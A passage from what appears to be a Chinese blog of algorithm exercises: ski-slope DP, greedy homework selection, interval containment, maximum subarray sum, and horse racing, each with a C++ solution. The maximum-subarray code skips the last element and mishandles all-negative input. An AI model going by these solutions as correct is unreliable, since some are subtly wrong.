class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x, y, h;</span><br><span class="line"></span><br><span class="line">&#125; a[<span class="number">10005</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.h&lt;b.h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">10005</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(node a,node b)</span></span>&#123;<span class="comment">//必须满足严格减小才可以滑下去，所以这里加判定</span></span><br><span class="line">    <span class="keyword">if</span>((b.h&gt;a.h)&amp;&amp;((a.x==b.x&amp;&amp;<span class="built_in">abs</span>(a.y-b.y)==<span class="number">1</span>)||(a.y==b.y&amp;&amp;<span class="built_in">abs</span>(a.x-b.x)==<span class="number">1</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[num].h;</span><br><span class="line">            a[num].x=i;</span><br><span class="line">            a[num].y=j;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a, a + num, cmp);</span><br><span class="line">    <span class="keyword">int</span> mmax = <span class="number">1</span>;<span class="comment">//必定经过自己</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num;++i)&#123;</span><br><span class="line">        dp[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i;++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(check(a[j],a[i]))</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], dp[j] + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mmax = <span class="built_in">max</span>(dp[i], mmax);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; mmax &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-homework"><a href="#0x04-homework" class="headerlink" title="0x04 homework"></a>0x04 homework</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</p><p>提示：float 的精度可能不够，你应该使用 double 类型。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37.00</span><br></pre></td></tr></table></figure><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">20</span>],b[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">double</span> ma[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n&amp;&amp;m!=<span class="number">0</span>&amp;&amp;n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> maxn=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;b[i];</span><br><span class="line">            ma[i]=<span class="keyword">double</span>(b[i])/a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> f=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">double</span> vm;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(f==m)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            vm=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(ma[i]&gt;vm)</span><br><span class="line">                &#123;</span><br><span class="line">                    vm=ma[i];</span><br><span class="line">                    s=i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n&lt;a[s])</span><br><span class="line">            &#123;</span><br><span class="line">                maxn=maxn+n*ma[s];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                maxn=maxn+b[s];</span><br><span class="line">                n=n-a[s];</span><br><span class="line">                ma[s]=<span class="number">0</span>;</span><br><span class="line">                f++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">cout</span>&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;<span class="built_in">std</span>::fixed&lt;&lt;maxn&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-区间包含问题"><a href="#0x05-区间包含问题" class="headerlink" title="0x05 区间包含问题"></a>0x05 区间包含问题</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组测试数据，对于每组测试数据：</p><p>第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 。</p><p>接下来 n 行每行包含两个整数 a ,b (0≤a&lt;b≤10^9) 。</p><p>接下来 m 行每行包含两个整数 l ,r (0≤l&lt;r≤10^9) 。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>对于每组测试数据，输出 m 行，每行包含一个整数。</p><p>数据过大请使用快速输入输出。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">1 2</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x7fffffff</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">&#125;node;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a, node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.r &lt; b.r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m)</span><br><span class="line">    &#123;</span><br><span class="line">        node *nnum = <span class="keyword">new</span> node[n];</span><br><span class="line">        node *mnum = <span class="keyword">new</span> node[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; nnum[i].l &gt;&gt; nnum[i].r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; mnum[i].l &gt;&gt; mnum[i].r;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(nnum, nnum + n, cmp);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> k = mnum[i].l; <span class="comment">//K初始的时候等于m数组的左边界</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((nnum[j].l &gt;= k))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nnum[j].r &lt;= mnum[i].r)</span><br><span class="line">                    &#123;</span><br><span class="line">                        res++;</span><br><span class="line">                        k = nnum[j].r;  <span class="comment">//每次更新成n数组的右边界</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>  <span class="comment">//右边界一旦超过，直接扔掉后面的部分结束质询</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span>[] nnum;</span><br><span class="line">        <span class="keyword">delete</span>[] mnum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-最长子序列"><a href="#0x06-最长子序列" class="headerlink" title="0x06 最长子序列"></a>0x06 最长子序列</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>在一个数组中找出和最大的连续几个数。（至少包含一个数）</p><p>例如：</p><p>数组A[] = [-2,1,-3,4,-1,2,1,-5,4]，则连续的子序列[4,-1,2,1]有最大的和6.</p><h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>第一行输入一个不超过1000的整数n。</p><p>第二行输入n个整数A[i]。</p><h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>输出一个整数，表示最大的和。</p><h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1 1 -2</span><br></pre></td></tr></table></figure><h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">1005</span>];</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n;++i)&#123;</span><br><span class="line">        b[i] = <span class="built_in">max</span>(b[i - <span class="number">1</span>] + a[i], a[i]);</span><br><span class="line">        sum = <span class="built_in">max</span>(b[i], sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; sum;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x07-渊子赛马"><a href="#0x07-渊子赛马" class="headerlink" title="0x07 渊子赛马"></a>0x07 渊子赛马</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>赛马是一古老的游戏，早在公元前四世纪的中国，处在诸侯割据的状态，历史上称为“战国时期”。在魏国作官的孙膑，因为受到同僚庞涓的迫害，被齐国使臣救出后，到达齐国国都。 赛马是当时最受齐国贵族欢迎的娱乐项目。上至国王，下到大臣，常常以赛马取乐，并以重金赌输赢。田忌多次与国王及其他大臣赌输赢，屡赌屡输。一天他赛马又输了，回家后闷闷不乐。孙膑安慰他说：“下次有机会带我到马场看看，也许我能帮你。” 孙膑仔细观察后发现，田忌的马和其他人的马相差并不远，只是策略运用不当，以致失败。 比赛前田忌按照孙膑的主意，用上等马鞍将下等马装饰起来，冒充上等马，与齐王的上等马比赛。第二场比赛，还是按照孙膑的安排，田忌用自己的上等马与国王的中等马比赛，在一片喝彩中，只见田忌的马竟然冲到齐王的马前面，赢了第二场。关键的第三场，田忌的中等马和国王的下等马比赛，田忌的马又一次冲到国王的马前面，结果二比一，田忌赢了国王。 就是这么简单，现在渊子也来赛一赛马。假设每匹马都有恒定的速度，所以速度大的马一定比速度小的马先到终点（没有意外！！）。不允许出现平局。最后谁赢的场数多于一半(不包括一半)，谁就是赢家(可能没有赢家)。渊子有 N(1&lt;=n&lt;=1000)匹马参加比赛。对手的马的数量与渊子马的数量一样，并且知道所有的马的速度。聪明的你来预测一下这场世纪之战的结果，看看渊子能否赢得比赛。</p><h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>输入有多组测试数据。 每组测试数据包括 3 行： 第一行输入 N。表示马的数量。 第二行有 N 个整型数字，即渊子的 N 匹马的速度。 第三行有 N 个整型数字，即对手的 N 匹马的速度。 当 N 为 0 时退出。</p><h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>若通过聪明的你精心安排，如果渊子能赢得比赛，那么输出YES。 否则输出NO。</p><h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">2 3 3 4 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">4</span><br><span class="line">2 2 1 2</span><br><span class="line">2 2 3 1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">NO</span><br></pre></td></tr></table></figure><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">1005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&amp;&amp;n!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; b[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(a, a + n);</span><br><span class="line">        sort(b, b + n);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[j]&gt;b[i])&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                    a[j] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;=n/<span class="number">2</span>+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"YES"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"NO"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x08-最长上升子序列"><a href="#0x08-最长上升子序列" class="headerlink" title="0x08 最长上升子序列"></a>0x08 最长上升子序列</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个长度为n的字符串S（只包含小写字母），给出q次查询，对于每次查询x，求出以S[x]（下标从0开始）为起始的最长上升子序列的长度（严格增）。</p><h3 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h3><p>第一行两个整数n,q(1&lt;=n,q&lt;=1e5)，意义见题目描述。</p><p>第二行一个长度为n的字符串S。</p><p>第三行q个整数x(0&lt;=x&lt;n)，表示q次查询。</p><h3 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h3><p>输出q个数（以空格分割，行末有空格），表示以S[x]为起始的最长上升子序列的长度。</p><h3 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10 3</span><br><span class="line">abbaaccbbd</span><br><span class="line">2 5 8</span><br></pre></td></tr></table></figure><h3 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3 2 